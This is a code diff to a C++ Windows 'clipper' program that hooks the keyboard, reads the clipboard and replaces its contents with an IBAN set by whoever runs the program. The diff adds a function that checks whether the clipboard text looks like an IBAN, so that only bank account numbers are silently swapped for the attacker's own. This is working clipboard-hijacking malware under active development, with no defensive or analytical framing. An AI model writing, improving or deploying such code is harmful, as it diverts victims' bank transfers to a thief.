@@ -11,8 +11,42 @@
 HHOOK keyboardHook;
 std::string IBAN = "BE0000000000000000"; // your IBAN TO SETUP;
 
+BOOL isIbanValue(char* ptrClipboardText){
+    if(ptrClipboardText == nullptr || *ptrClipboardText == '\0')
+    {
+        return false;
+    }
+
+    size_t length = strlen(ptrClipboardText);
+
+    if (length < 15 || length > 34) 
+    {
+        return false;
+    }
+
+    if (!std::isalpha(ptrClipboardText[0]) || !std::isalpha(ptrClipboardText[1])) 
+    {
+        return false;
+    }
+
+    if (!std::isdigit(ptrClipboardText[2]) || !std::isdigit(ptrClipboardText[3])) 
+    {
+        return false;
+    }
+
+    for (size_t i = 4; i < length; ++i) 
+    {
+        if (!std::isalnum(ptrClipboardText[i])) 
+        {
+            return false;
+        }
+    }
+
+    return true;
+}
+
 /**
- * Base clipper function callback function.
+ * Base clipper callback function.
  */
 LRESULT CALLBACK clipper(int nCode, WPARAM wParam, LPARAM lParam) {
     HANDLE hClipboardData = nullptr;
@@ -26,7 +60,7 @@ LRESULT CALLBACK clipper(int nCode, WPARAM wParam, LPARAM lParam) {
             if (hClipboardData != nullptr) 
             {
                 char* pClipboardText = static_cast<char*>(GlobalLock(hClipboardData));
-                if (pClipboardText != nullptr) 
+                if (pClipboardText != nullptr && isIbanValue(pClipboardText)) 
                 {
                     std::string newText = IBAN; // New clipboard content
                     GlobalUnlock(hClipboardData);
